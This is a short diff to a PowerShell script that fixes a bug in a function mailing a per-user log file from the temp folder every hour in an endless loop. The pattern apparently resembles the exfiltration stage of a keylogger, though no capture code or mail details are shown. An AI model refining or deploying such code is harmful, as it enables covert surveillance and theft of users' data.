@@ -27,8 +27,10 @@ function sendMail($logFile="$env:temp\$env:username.log") {
 function scheduleMail($MinutesInterval=60) {
         $now = Get-Date
         $SecondsInterval = $MinutesInterval * 60
-        $nextInterval = $now.AddMinutes($Interval - ($now.Minute % $MinutesInterval))
-        Start-Sleep -Seconds ($nextInterval - $now).TotalSeconds
+        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
+		$timeLeft = ($nextInterval - $now).TotalSeconds
+	
+        Start-Sleep -Seconds $timeLeft
         while ($true) {
             sendMail
             Start-Sleep -Seconds $SecondsInterval
@@ -36,4 +38,4 @@ function scheduleMail($MinutesInterval=60) {
 }
 
 sendMail
-scheduleMail
+scheduleMail -MinutesInterval 60
